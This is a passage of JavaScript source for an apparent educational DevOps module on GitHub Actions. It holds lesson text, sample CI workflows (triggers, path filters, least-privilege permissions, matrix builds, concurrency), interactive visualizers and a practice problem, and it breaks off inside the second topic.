(function () {
  var topics = [], practice = [], quiz = [], interview = [];
  var R = String.raw; // raw template: backslashes in shell code stay as typed
  var LAB = 'A free GitHub account and a throwaway repository (GitHub-hosted runners are free for public repos and have a monthly free allowance for private ones), or <b>act</b> to run workflows locally in Docker (<code>act -j test</code>). GitLab CI and Jenkins are shown as equivalents. No cloud account is needed for the core labs: deploys target a local container or GitHub Pages. Every secret in this module is a placeholder.';
  var SKIP = { skip: 'pipeline configuration, verified by reading' };
  var PYC = '<p>Pure computation, Python 3 standard library only. The model answer for the real task is the YAML or bash; the Python function is tested.</p>';
  // In this file "@{{" stands for the GitHub expression opener (dollar + two braces). A JS template literal would try to
  // interpolate the real thing, so fix() below turns "@{{" into the real text when the module is registered:
  // in code fields it becomes the dollar form, in prose it becomes an HTML entity (the validator forbids a literal dollar-brace in HTML).
  // "\${" in raw code means the shell's dollar-brace.
  function Y(code, title) { var s = { lang: 'yaml', code: code }; if (title) s.title = title; return s; }     // parsed as YAML by the validator
  function SH(code, title) { var s = { lang: 'bash', code: code }; if (title) s.title = title; return s; }   // bash -n checked
  function PY(code, title) { return { lang: 'python', title: title || 'Python model (tested)', code: code }; }
  // Jenkinsfiles (Groovy) have no checker in tools/validate.js, so they use lang 'text' with check: false (same convention as Dockerfiles in devops08).
  function JF(code, title) { return { lang: 'text', check: false, title: title || 'Jenkinsfile', code: code }; }
  function snip(c) { return typeof c === 'string' ? SH(c) : c; }
  function P(o) {
    var p = {
      title: o.t, level: o.l, tags: o.tags, companies: o.co,
      statement: o.s, constraints: o.c || LAB, example: o.ex,
      brute: { why: o.bw },
      mcq: { q: o.q[0], options: o.q[1], answer: o.q[2], explain: o.q[3] },
      hints: o.h,
      solution: { approach: o.a, code: snip(o.code), complexity: o.cx, followUps: o.f },
      tests: o.tests || SKIP
    };
    if (o.alt) p.solution.alt = o.alt.map(snip);
    if (o.bc) p.brute.code = snip(o.bc);
    return p;
  }
  function box(id, label, x, y, w) { return { id: id, label: label, x: x, y: y, shape: 'box', w: w || 18 }; }
  function one(k, v) { var h = {}; h[k] = v; return h; }
  function pad4(f, tip) { while (f.length < 4) f.push({ narr: tip, parts: f[f.length - 1].parts }); return f; }
  var D2 = '$' + '{{';   // the expression opener, for visualizer text built at run time

  // Does a changed file match a GitHub path filter? * does not cross /, ** does, ? is one character, ! negates (later patterns win).
  function ghGlob(p) {
    var re = '', i = 0;
    while (i < p.length) {
      var ch = p.charAt(i);
      if (ch === '*' && p.charAt(i + 1) === '*') { re += '.*'; i += 2; if (p.charAt(i) === '/') { re = re.slice(0, -2) + '(?:.*/)?'; i++; } continue; }
      if (ch === '*') re += '[^/]*';
      else if (ch === '?') re += '[^/]';
      else re += ch.replace(/[.+^(){}|[\]\\$]/g, '\\$&');
      i++;
    }
    return new RegExp('^' + re + '$');
  }
  function pathsMatch(filters, file) {
    var hit = false;
    filters.forEach(function (f) {
      if (f.charAt(0) === '!') { if (ghGlob(f.slice(1)).test(file)) hit = false; }
      else if (ghGlob(f).test(file)) hit = true;
    });
    return hit;
  }
  // Longest path through a job graph. jobs: ["name|minutes|dep,dep", ...]
  function parseJobs(lines) {
    var jobs = {}, order = [];
    lines.forEach(function (ln) {
      var p = ln.split('|');
      if (p.length < 2) throw new Error('Each job needs: name|minutes|deps, e.g. test|8|build');
      var name = p[0].trim(), m = Number(p[1]);
      if (!name || isNaN(m) || m < 0) throw new Error('Minutes must be a number: ' + ln);
      jobs[name] = { name: name, min: m, deps: (p[2] || '').split(',').map(function (s) { return s.trim(); }).filter(Boolean) };
      order.push(name);
    });
    order.forEach(function (n) { jobs[n].deps.forEach(function (d) { if (!jobs[d]) throw new Error('Job ' + n + ' needs unknown job ' + d); }); });
    return { jobs: jobs, order: order };
  }
  function finishTimes(g) {
    var fin = {}, from = {}, visiting = {};
    function go(n) {
      if (fin.hasOwnProperty(n)) return fin[n];
      if (visiting[n]) throw new Error('Cycle through ' + n + ': needs can never loop');
      visiting[n] = true;
      var best = 0, who = null;
      g.jobs[n].deps.forEach(function (d) { var t = go(d); if (who === null || t > best) { best = t; who = d; } });
      visiting[n] = false;
      fin[n] = best + g.jobs[n].min; from[n] = who;
      return fin[n];
    }
    g.order.forEach(go);
    return { fin: fin, from: from };
  }

  // ───────────────────────── Topic 1: CI/CD and the workflow file ─────────────────────────
  var CI_BASIC = R`# .github/workflows/ci.yml
# Lab: your first workflow. Safe: it only reads your code and runs tests on a GitHub-hosted runner.
name: ci

on:
  push:
    branches: [main]
    paths-ignore: ['**.md', 'docs/**']      # a typo fix in the docs should not cost 25 minutes
  pull_request:
    paths:
      - 'src/**'
      - 'package.json'
      - 'package-lock.json'
      - '.github/workflows/ci.yml'          # changing the pipeline must test the pipeline
  workflow_dispatch:                        # adds a "Run workflow" button
    inputs:
      debug:
        description: 'Print extra diagnostics'
        type: boolean
        default: false

permissions:
  contents: read                            # least privilege: the token can only read the repo

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10                     # a hung test must not burn the free allowance
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm                        # restores ~/.npm keyed on package-lock.json
      - run: npm ci
      - run: npm test
      - name: Extra diagnostics
        if: inputs.debug
        run: node --version && npm --version`;

  topics.push({
    title: 'CI, CD and the Anatomy of a Workflow File',
    analogy: `<p>A pipeline is a <b>restaurant kitchen's pass</b>. Every dish (a commit) goes through the same stations in the same order: prep, cook, taste, plate, serve. Nobody carries a plate out the door just because "it looked fine". <b>Continuous integration</b> is the tasting at the pass: every change is built and tested the moment it lands, so a bad dish is caught while the cook still remembers what they did. <b>Continuous delivery</b> is the rule that any dish that passed can be served at any time. <b>Continuous deployment</b> goes one step further: the waiter takes it out automatically.</p>`,
    explain: `<p>🟢 <b>The three words.</b> People use them loosely, so pin them down:</p>
      ${H.table(['Term', 'What it means', 'Who presses the button?'], [
        ['<b>Continuous Integration (CI)</b>', 'Every push and pull request is built and tested automatically. The goal is a main branch that always works.', 'Nobody: it runs on every change'],
        ['<b>Continuous Delivery</b>', 'Every change that passes CI produces a release-ready package and can be deployed at any time.', 'A human decides when (often one approval click)'],
        ['<b>Continuous Deployment</b>', 'Every change that passes all checks goes to production by itself.', 'Nobody: tests and health checks are the gate']
      ])}
      <p>🟢 <b>GitHub Actions in one paragraph.</b> You put a YAML file in <code>.github/workflows/</code>. GitHub watches for the <b>events</b> named under <code>on:</code> (a push, a pull request, a schedule, a button). When one happens, it starts a <b>workflow run</b>. A run is made of <b>jobs</b>; each job gets a fresh virtual machine called a <b>runner</b>; each job is a list of <b>steps</b>; a step either runs a shell command (<code>run:</code>) or uses a packaged action (<code>uses:</code>).</p>
      ${H.table(['Word', 'Think of it as', 'Example'], [
        ['Workflow', 'one YAML file = one recipe', '<code>ci.yml</code>'],
        ['Event / trigger', 'the doorbell', '<code>push</code>, <code>pull_request</code>, <code>schedule</code>, <code>workflow_dispatch</code>'],
        ['Job', 'a station with its own clean kitchen (VM)', '<code>test</code>, <code>build</code>, <code>deploy</code>'],
        ['Runner', 'the machine that runs a job', '<code>ubuntu-latest</code> (GitHub-hosted) or your own server (self-hosted)'],
        ['Step', 'one instruction in the job', '<code>run: npm test</code>'],
        ['Action', 'a reusable step someone else wrote', '<code>actions/checkout@v4</code>']
      ])}
      <p>🔵 <b>Triggers worth knowing.</b> <code>push</code> and <code>pull_request</code> can be limited with <code>branches:</code> and <code>paths:</code> (or <code>paths-ignore:</code>). Path filters use globs: <code>*</code> does not cross a slash, <code>**</code> does. <code>workflow_dispatch</code> gives a manual button with typed <code>inputs</code>. <code>schedule</code> uses cron (UTC) and is best-effort, not exact. <code>workflow_call</code> makes the file reusable by other workflows (topic 4).</p>
      <p>🔵 <b>The token and the first rule of safety.</b> Every run gets a short-lived <code>GITHUB_TOKEN</code>. Set <code>permissions: contents: read</code> at the top and grant extra rights per job only when needed. The default for older repositories can be broader than you expect.</p>
      <p>🔵 <b>Where it runs.</b> Push the file and watch the <b>Actions</b> tab. To iterate without a commit per attempt, run it locally with <code>act</code> (it runs the jobs in Docker containers on your laptop; some hosted-only features differ).</p>`,
    clues: [
      '"Every PR must be tested before merge" → CI on <code>pull_request</code> plus a required status check in branch protection',
      '"A README change triggered the whole pipeline" → <code>paths</code> / <code>paths-ignore</code> filters on the trigger (and remember the workflow file itself must be in <code>paths</code>)',
      '"Deploy on every merge to main, but let me also run it by hand" → <code>push: branches: [main]</code> plus <code>workflow_dispatch</code> with inputs',
      '"What is the difference between delivery and deployment?" → delivery = ready to ship, human chooses when; deployment = automatic to production',
      '"Run the nightly security scan" → <code>schedule</code> with a cron expression (UTC, may start a few minutes late)',
      '"The pipeline can write to my repo and I never asked it to" → set top-level <code>permissions:</code> to the minimum'
    ],
    code: [Y(CI_BASIC)],
    codeTitle: ['A complete first workflow: triggers, path filters, least privilege, a timeout'],
    viz: [{
      title: 'Path filters: does this push start the workflow?',
      input: 'paths: src/**, package.json, !src/**/*.md | changed: src/app.js, README.md, src/docs/guide.md, package.json',
      inputLabel: 'paths: <filters, comma separated; ! excludes> | changed: <files>',
      gen: function (input) {
        var m = String(input || '').match(/^\s*paths:\s*(.*?)\s*\|\s*changed:\s*(.*)$/i);
        if (!m) throw new Error('Format: paths: src/**, !src/**/*.md | changed: src/a.js, README.md');
        var filters = m[1].split(',').map(function (s) { return s.trim(); }).filter(Boolean);
        var files = m[2].split(',').map(function (s) { return s.trim(); }).filter(Boolean);
        if (!filters.length || !files.length) throw new Error('Give at least one filter and one changed file');
        if (files.length > 12 || filters.length > 8) throw new Error('At most 8 filters and 12 files');
        var frames = [], rows = [], hl = {}, any = false;
        frames.push({ narr: 'A <code>push</code> arrived. GitHub looks at <b>every changed file</b> and compares it with the <code>paths:</code> filters, in order. A <code>!</code> filter removes files again, and the last filter that matches wins.', parts: [
          { type: 'set', label: 'paths filters (in order)', items: filters },
          { type: 'set', label: 'files changed in this push', items: files }
        ] });
        files.forEach(function (f, i) {
          var hit = pathsMatch(filters, f), why = 'no filter matches';
          filters.forEach(function (p) {
            var neg = p.charAt(0) === '!', body = neg ? p.slice(1) : p;
            if (ghGlob(body).test(f)) why = neg ? 'excluded by ' + p : 'matched ' + p;
          });
          if (hit) any = true;
          rows.push([f, hit ? 'MATCH' : 'no match', why]);
          hl[i] = hit ? 'ok' : 'bad';
          frames.push({ narr: '<code>' + H.esc(f) + '</code>: ' + (hit ? '<b class="c-g">matches</b>' : '<b class="c-r">does not match</b>') + ' (' + H.esc(why) + '). ' + (hit ? 'One matching file is enough to start the workflow.' : 'This file alone would not start it.'), parts: [
            { type: 'table', label: 'files checked so far', columns: ['file', 'result', 'reason'], rows: rows.slice(), hl: JSON.parse(JSON.stringify(hl)) }
          ] });
        });
        frames.push({ narr: any ? '<b class="c-g">The workflow runs.</b> At least one changed file matched. Remember: with <code>paths</code> on a required check, a skipped workflow leaves the check "pending" forever on that PR, so required checks need a different pattern (topic 3).' : '<b class="c-r">The workflow does not start.</b> No changed file matched. That is the goal for docs-only changes: no runner minutes spent.', parts: [
          { type: 'table', label: 'final result', columns: ['file', 'result', 'reason'], rows: rows.slice(), hl: JSON.parse(JSON.stringify(hl)) }
        ] });
        return pad4(frames, 'Done.');
      }
    }],
    examples: [
      { title: 'Situation: a README typo started a 25-minute pipeline', html: `<p>The team merged ten docs fixes a day and each started the full build, test and image push. That is <b>about 4 hours of runner time a day</b> wasted, and the queue made real PRs wait. The fix is two lines: <code>paths-ignore: ['**.md', 'docs/**']</code> on <code>push</code> and a <code>paths:</code> allow-list on <code>pull_request</code>. Cost: zero. Lesson: the cheapest minute is the one you never run.</p>` },
      { title: 'The three events you will use 90% of the time', html: `<p><b>push</b> to main = "this is now the truth, build the artifact". <b>pull_request</b> = "prove this proposal is safe", with a read-only token and no secrets when it comes from a fork. <b>workflow_dispatch</b> = "a human wants to run this now", with inputs such as the version to deploy. Most real repos have one workflow for each, sharing steps through reusable workflows.</p>` },
      { title: 'A tiny manual workflow with typed inputs', html: `<p>Inputs have types (<code>string</code>, <code>boolean</code>, <code>choice</code>, <code>environment</code>) so the button shows a proper dropdown and nobody types a typo into production.</p>`, code: Y(R`name: manual-deploy
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Where to deploy'
        type: choice
        options: [staging, production]
        default: staging
      version:
        description: 'Git tag or image digest to deploy'
        type: string
        required: true
permissions:
  contents: read
jobs:
  show:
    runs-on: ubuntu-latest
    steps:
      - name: Print the request
        env:
          TARGET: @{{ inputs.target }}
          VERSION: @{{ inputs.version }}
        run: echo "Would deploy $VERSION to $TARGET"`, 'workflow_dispatch with typed inputs') },
      { title: 'Running the same file locally with act', html: `<p><code>act</code> reads your workflow and runs jobs in Docker. It is perfect for fast feedback on <code>run:</code> steps, but it does not reproduce GitHub's environments, OIDC or most caches, so treat it as a smoke test, not the final word.</p>`, code: SH(R`# Install: brew install act   (or see the nektos/act README for Linux/Windows)
act -l                         # list jobs found in .github/workflows
act pull_request -j test       # run the "test" job as if a PR was opened
act workflow_dispatch --input debug=true -j test
# Secrets are placeholders here, never real values:
act -j test -s API_TOKEN=dummy-token-for-local-run`, 'Local runs') }
    ],
    deepDive: `<p>🟣 <b>Events carry context.</b> Inside a run, the <code>github</code> context holds the event (<code>github.event</code>), the commit (<code>github.sha</code>), the ref (<code>github.ref</code>) and the actor. For <code>pull_request</code>, <code>github.sha</code> is the temporary <b>merge commit</b> of the PR into the base, not the branch tip, which surprises people when a deploy tag looks "wrong". Use <code>github.event.pull_request.head.sha</code> when you really need the tip.</p>
      <p>🟣 <b>YAML traps.</b> <code>on</code> is parsed by some YAML 1.1 tools as the boolean <code>true</code>; GitHub handles it, linters may complain. Quote strings that start with <code>*</code>, <code>!</code>, <code>@</code> or <code>%</code> (as in <code>'**.md'</code>). A step with both <code>uses</code> and <code>run</code> is an error. Indentation mistakes silently move a key to the wrong level, so lint with <code>actionlint</code> before pushing.</p>
      <p>🟣 <b>Cost model.</b> Hosted runners bill by the minute (rounded up per job), Linux cheapest, Windows about 2x, macOS about 10x. Public repositories are free. Private repositories get a monthly allowance. A job that only waits (for a manual approval) is not billed while waiting if it uses an <code>environment</code> gate, but a job that sleeps in a loop is.</p>
      <p>🟣 <b>Trunk-based flow.</b> Short-lived branches, small PRs, CI on every PR, merge to main, deploy main. This is the flow the rest of the module assumes, and it matches the Git module (Cloud & DevOps 4). Long-lived release branches multiply the pipelines you maintain.</p>`,
    aiEra: `<p>🤖 AI assistants write workflow YAML quickly, and the common failure is <b>plausible but outdated or unsafe</b>: an old <code>actions/checkout@v2</code>, <code>permissions: write-all</code>, a deploy on every <code>pull_request</code>, or a made-up input name that YAML accepts and GitHub ignores. Run <code>actionlint</code>, read every <code>uses:</code> and <code>permissions:</code> line yourself, and test in a throwaway repo first.</p>
      <p>🤖 Use AI well for the boring parts: converting a Jenkinsfile to Actions, explaining a failing log, or proposing path filters from your repo tree. Paste the real error and the file, and ask it to explain <i>why</i> before you apply the fix. Never paste real secrets into a prompt.</p>`,
    problems: [P({
      t: 'Write the first CI workflow with path filters', l: 'Easy', tags: ['github actions', 'ci', 'triggers', 'permissions'], co: ['Atlassian', 'Thoughtworks', 'Infosys'],
      s: `<p>Your repo has a Python service in <code>app/</code> with <code>requirements.txt</code> and tests in <code>tests/</code>. Docs live in <code>docs/</code>. Write <code>.github/workflows/ci.yml</code> that runs the tests on pull requests and on pushes to <code>main</code>, but <b>not</b> when only <code>docs/</code> or markdown files change. Use read-only permissions, a timeout, and cache pip downloads.</p>`,
      ex: `<p>A PR that edits only <code>docs/intro.md</code> → ${H.c('g', 'no workflow run')}. A PR that edits <code>app/main.py</code> → ${H.c('g', 'one run of job test')}. Editing <code>.github/workflows/ci.yml</code> must also trigger it, otherwise a broken pipeline can merge unnoticed.</p>`,
      bw: `<p>A bare <code>on: [push, pull_request]</code> with no filters, no permissions and no timeout. Every docs edit burns a full run, the token can write to the repo, and a hung test can run for the default six hours.</p>`,
      bc: Y(R`name: ci
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: pytest`, 'naive: no filters, no limits'),
      q: ['A required check is configured, but the workflow has <code>paths:</code> and a PR touches only docs. What happens to the check?', ['It stays "expected / pending" and blocks the merge', 'It passes automatically', 'It is skipped and the merge is allowed', 'GitHub runs the workflow anyway'], 0, 'When a workflow is skipped by path filters, its required check never reports, so the PR waits. Fix: do not require that exact check, or add a tiny always-run aggregate job without path filters (topic 3).'],
      h: ['<p>Hint 1: <code>paths-ignore</code> on <code>push</code> is simplest; for <code>pull_request</code>, an allow-list <code>paths</code> is clearer. You cannot use <code>paths</code> and <code>paths-ignore</code> for the same event.</p>', '<p>Hint 2: <code>actions/setup-python@v5</code> has <code>cache: pip</code> built in. It keys on <code>requirements.txt</code>.</p>', '<p>Hint 3: add <code>permissions: contents: read</code> at the top and <code>timeout-minutes</code> on the job. Include the workflow file in the <code>paths</code> list.</p>'],
      a: `<p>Filter at the trigger so no runner is even requested. Use an allow-list for PRs (code, requirements, the workflow itself) and an ignore-list for pushes. Give the token the minimum right (read contents), cap the job time, and use the built-in pip cache. Always include the workflow file in the path list so pipeline changes are tested by the pipeline.</p>`,
      code: Y(R`name: ci
on:
  push:
    branches: [main]
    paths-ignore: ['docs/**', '**.md']
  pull_request:
    paths:
      - 'app/**'
      - 'tests/**'
      - 'requirements.txt'
      - '.github/workflows/ci.yml'
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: pip
      - run: pip install -r requirements.txt
      - run: python -m pytest -q`, 'ci.yml'),
      cx: `<p>No algorithmic cost; the saving is runner minutes. A typical repo avoids 30-60% of its runs with sensible path filters.</p>`,
      f: ['How would you handle a monorepo with three services so each has its own filtered workflow?', 'Why does <code>pull_request</code> from a fork get no secrets, and how does that affect this workflow?']
    })]
  });

  // ───────────────────────── Topic 2: jobs, runners, matrix, concurrency ─────────────────────────
  var JOBS_YAML = R`# .github/workflows/pipeline.yml
# Jobs run IN PARALLEL unless "needs" says otherwise. The slowest chain sets the total time.
name: pipeline
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:                                  # one run per branch/PR at a time
  group: pipeline-@{{ github.workflow }}-@{{ github.head_ref || github.ref }}
  cancel-in-progress: true                    # a newer push makes the older CI run pointless

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm run lint

  test:
    runs-on: @{{ matrix.os }}
    timeout-minutes: 15
    strategy:
      fail-fast: false                        # see ALL failures, not just the first
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22]
        exclude:
          - os: windows-latest
            node: 20                          # we do not ship that combination
        include:
          - os: ubuntu-latest
            node: 22
            coverage: true                    # extra variable only for this one job
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: @{{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test
      - if: matrix.coverage
        run: npm run coverage

  build:
    needs: [lint, test]                       # waits for BOTH; skipped if either fails
    runs-on: ubuntu-latest
    outputs:
      version: @{{ steps.ver.outputs.version }}   # passed to later jobs
    steps:
      - uses: actions/checkout@v4
      - id: ver
        run: echo "version=$(git rev-parse --short HEAD)" >> "$GITHUB_OUTPUT"
      - run: echo "building @{{ steps.ver.outputs.version }}"`;

  topics.push({
    title: 'Jobs, Runners, Matrix Builds and Concurrency',
    analogy: `<p>Think of a <b>building site</b>. Jobs are crews: the electricians, plumbers and painters can work at the same time in different rooms (parallel jobs). The painters must wait until the plasterers finish (<code>needs</code>). The whole building is ready only when the slowest chain of dependent crews is done, not when the sum of everyone's hours is done. A <b>matrix</b> is hiring the same crew once for each flat in the block. <b>Concurrency</b> is the site manager's rule: "only one crew may use the lift at a time".</p>`,
    explain: `<p>🟢 <b>Jobs run in parallel by default.</b> Each job starts on its own clean runner, so files from one job are <i>not</i> there in the next. To order jobs, write <code>needs: [other_job]</code>. To pass a small value (a version string) use job <code>outputs</code>; for files use artifacts (topic 3).</p>
      ${H.table(['Runner label', 'What you get', 'Good for'], [
        ['<code>ubuntu-latest</code>', 'Ubuntu 24.04 VM, Docker installed, cheapest', 'almost everything'],
        ['<code>ubuntu-24.04-arm</code>', 'Linux on ARM64, same price tier', 'building arm64 images natively'],
        ['<code>windows-latest</code>', 'Windows Server VM, about 2x the cost', '.NET Framework, Windows-only tests'],
        ['<code>macos-latest</code>', 'Apple silicon Mac, about 10x the cost', 'iOS builds, macOS tests'],
        ['<code>self-hosted</code>', 'your own machine with the runner agent', 'private networks, GPUs, big caches; <b>you</b> patch and secure it']
      ])}
      <p>🟢 <b>Matrix = many jobs from one definition.</b> <code>strategy.matrix</code> takes lists and runs every combination: 2 operating systems x 3 Node versions = 6 jobs. <code>exclude</code> removes combinations. <code>include</code> adds extra combinations or extra variables to existing ones. <code>fail-fast: true</code> (default) cancels the others when one fails; set it to <code>false</code> when you want the full picture.</p>
      <p>🔵 <b>Concurrency groups.</b> A <code>concurrency:</code> block names a group. Only one run in a group is active; the rest wait (only the newest waiting run is kept). With <code>cancel-in-progress: true</code> the older run is cancelled. Use it for <b>CI</b> (new push replaces old) and <b>not</b> for deploys. For deploys, queue them (<code>cancel-in-progress: false</code>) so a half-finished deploy is never killed.</p>
      <p>🔵 <b>Conditions and status.</b> By default a step runs only if previous steps succeeded. <code>if: always()</code> runs even after failure (cleanup, upload logs). <code>if: failure()</code> runs only after a failure. <code>if: github.ref == 'refs/heads/main'</code> limits a job to main. A job that <code>needs</code> a failed job is skipped unless you use <code>if: always()</code>.</p>
      <p>🔵 <b>Time is the longest chain.</b> If lint takes 2 minutes, build 4, unit tests 6 and e2e 9, with e2e and unit after build and a package step after both, the wall-clock time is the longest path (build 4 + e2e 9 + package 3 = 16), not the sum (24). The visualizer below computes this for any graph.</p>`,
    clues: [
      '"Run tests on Node 18, 20 and 22 on Linux and Windows" → <code>strategy.matrix</code> with <code>exclude</code>/<code>include</code> for odd cases',
      '"Two deploys ran at the same time and the older one won" → a <code>concurrency</code> group with <code>cancel-in-progress: false</code> (queue, do not kill)',
      '"Every push to a PR starts a new run and the old ones keep burning minutes" → <code>concurrency</code> keyed on the PR ref with <code>cancel-in-progress: true</code>',
      '"Job B needs a value computed in job A" → job <code>outputs</code> written to <code>$GITHUB_OUTPUT</code>, read as <code>needs.A.outputs.name</code>',
      '"Cleanup must run even when tests fail" → <code>if: always()</code> on that step',
      '"How long will the pipeline take?" → the critical path through the <code>needs</code> graph, not the sum of jobs'
    ],
    code: [Y(JOBS_YAML)],
    codeTitle: ['Parallel lint and a test matrix, then a build that needs both'],
    viz: [{
      title: 'Critical path: how long does the pipeline really take?',
      input: 'lint|2|; build|4|; unit|6|build; e2e|9|build; package|3|unit,e2e; deploy|2|package,lint',
      inputLabel: 'jobs as name|minutes|needs,needs separated by ;',
      gen: function (input) {
        var lines = String(input || '').split(';').map(function (s) { return s.trim(); }).filter(Boolean);
        if (!lines.length) throw new Error('Format: build|4|; test|6|build');
        if (lines.length > 9) throw new Error('At most 9 jobs');
        var g = parseJobs(lines), ft = finishTimes(g), level = {};
        function lv(n) { if (level.hasOwnProperty(n)) return level[n]; var m = 0; g.jobs[n].deps.forEach(function (d) { m = Math.max(m, lv(d) + 1); }); level[n] = m; return m; }
        g.order.forEach(lv);
        var maxL = 0, per = {}, nodes = [], edges = [], total = 0, last = null, sum = 0;
        g.order.forEach(function (n) { maxL = Math.max(maxL, level[n]); sum += g.jobs[n].min; if (ft.fin[n] > total) { total = ft.fin[n]; last = n; } });
        g.order.forEach(function (n) {
          var l = level[n]; per[l] = (per[l] || 0) + 1;
          nodes.push({ id: n, label: n + ' ' + g.jobs[n].min + 'm', shape: 'box', w: 16, x: maxL ? 9 + l * (82 / maxL) : 50, y: 8 + (per[l] - 1) * 15 });
          g.jobs[n].deps.forEach(function (d) { edges.push([d, n]); });
        });
        var frames = [], tags = {}, hl = {};
        function gp(narr, ehl) { return { narr: narr, parts: [{ type: 'graph', label: 'needs graph (arrow = "must finish first")', height: 66, nodes: nodes, edges: edges, hl: JSON.parse(JSON.stringify(hl)), tags: JSON.parse(JSON.stringify(tags)), ehl: ehl || {} }, { type: 'vars', label: 'totals', vals: { 'sum of all jobs': sum + ' min', 'critical path so far': Math.max.apply(null, [0].concat(Object.keys(ft.fin).filter(function (k) { return tags.hasOwnProperty(k); }).map(function (k) { return ft.fin[k]; }))) + ' min' } }] }; }
        frames.push(gp('Each box is a job with its own duration. Jobs with no <code>needs</code> start at minute 0 on their own runners, in parallel.'));
        g.order.slice().sort(function (a, b) { return ft.fin[a] - ft.fin[b]; }).forEach(function (n) {
          var start = ft.fin[n] - g.jobs[n].min;
          tags[n] = 'ends ' + ft.fin[n]; hl[n] = 'cur';
          frames.push(gp('<b>' + H.esc(n) + '</b> can start at minute ' + start + (g.jobs[n].deps.length ? ' (the latest of its needs: ' + H.esc(g.jobs[n].deps.join(', ')) + ')' : ' (it needs nothing)') + ' and finishes at minute <b>' + ft.fin[n] + '</b>.'));
          hl[n] = 'ok';
        });
        var path = [], ehl = {}, cur = last;
        while (cur) { path.unshift(cur); if (ft.from[cur]) ehl[ft.from[cur] + '-' + cur] = 'sel'; cur = ft.from[cur]; }
        path.forEach(function (n) { hl[n] = 'sel'; });
        frames.push(gp('<b>Critical path: ' + H.esc(path.join(' → ')) + ' = ' + total + ' minutes.</b> Running everything one after another would take ' + sum + '. To make the pipeline faster, shorten a job <i>on this path</i>; speeding up any other job changes nothing.', ehl));
        return pad4(frames, 'Done.');
      }
    }],
    examples: [
      { title: 'Situation: two deploys racing', html: `<p>Two PRs merge two minutes apart. Both start a deploy job. Deploy B (newer code) finishes first; deploy A (older code) finishes last, so <b>production ends up on the older version</b>. A concurrency group with a single name makes them take turns, and <code>cancel-in-progress: false</code> lets A finish cleanly before B starts. Even better, the deploy job can refuse to go backwards by checking the commit order.</p>`, code: Y(R`jobs:
  deploy:
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-production            # same name = same queue, across all branches
      cancel-in-progress: false           # never kill a deploy that is half done
    steps:
      - run: echo "deploying @{{ github.sha }}"`, 'Deploys take turns') },
      { title: 'Matrix include and exclude, worked by hand', html: `<p>Matrix <code>os: [ubuntu, windows]</code> x <code>node: [18, 20]</code> gives 4 combinations. <code>exclude: [{os: windows, node: 18}]</code> removes one, leaving 3. <code>include: [{os: ubuntu, node: 20, coverage: true}]</code> matches the existing ubuntu/20 job and adds <code>coverage: true</code> to it. <code>include: [{os: macos, node: 20}]</code> matches nothing, so it becomes a <b>new</b> fourth job. Order of evaluation: product, then exclude, then include.</p>${H.table(['Step', 'Jobs'], [['product', 'ubuntu/18, ubuntu/20, windows/18, windows/20'], ['exclude windows/18', 'ubuntu/18, ubuntu/20, windows/20'], ['include ubuntu/20 + coverage', 'ubuntu/18, ubuntu/20 (coverage), windows/20'], ['include macos/20', '+ macos/20 as a new job']])}` },
      { title: 'Passing a value between jobs', html: `<p>Job A writes <code>echo "tag=v1.4.2" &gt;&gt; "$GITHUB_OUTPUT"</code> in a step with <code>id: ver</code>, exposes it with <code>outputs: { tag: @{{ steps.ver.outputs.tag }} }</code>, and job B (with <code>needs: A</code>) reads <code>@{{ needs.A.outputs.tag }}</code>. Outputs are small strings (1 MB limit). Anything bigger goes in an artifact.</p>` },
      { title: 'Self-hosted runners: power with a catch', html: `<p>A self-hosted runner can reach your private network and keep a warm cache, which cuts minutes. The catch: the job runs <b>on your machine, with whatever that machine can reach</b>. Never attach a self-hosted runner to a public repository (anyone can open a PR that runs code on it). Prefer ephemeral runners that are created for one job and destroyed after, and keep them in a separate network segment.</p>` }
    ],
    deepDive: `<p>🟣 <b>Matrix limits.</b> A matrix can produce at most 256 jobs per workflow run. <code>max-parallel</code> caps how many run at once, which matters for rate-limited test databases. A matrix can be built dynamically: one job outputs a JSON list (<code>fromJSON</code>) and the next uses <code>matrix: { service: @{{ fromJSON(needs.plan.outputs.services) }} }</code>. That is how monorepos test only the services that changed.</p>
      <p>🟣 <b>Concurrency details.</b> Group names are strings and can use expressions. At most one run <i>pending</i> exists per group; a third arrival replaces the pending one (that is by design, because only the newest matters). To keep every queued run, use unique group names plus your own ordering. <code>concurrency</code> can sit at workflow level or job level; job level is right for deploys, because the build can still run in parallel.</p>
      <p>🟣 <b>Required checks with matrices.</b> Branch protection requires checks by <b>name</b>. A matrix job's name includes its values (<code>test (ubuntu-latest, 22)</code>), so changing the matrix breaks the required-check list. The robust pattern: a final job <code>ci-ok</code> with <code>needs: [lint, test, build]</code> and <code>if: always()</code> that fails if any needed job failed or was cancelled (check <code>needs.*.result</code>). Require only <code>ci-ok</code>. It also fixes the "skipped by path filter" problem above when the aggregate lives in an always-running workflow.</p>
      <p>🟣 <b>Hosted runner reality.</b> Each job is a fresh VM: about 15-30 s to boot and checkout. Splitting a 2-minute job into five 30-second jobs makes it slower and more expensive. Parallelism pays when jobs are minutes long. Standard hosted Linux runners have 4 vCPU/16 GB in public repositories and 2 vCPU/7 GB in private ones; larger runners cost more but can beat a matrix when a build is CPU bound.</p>`,
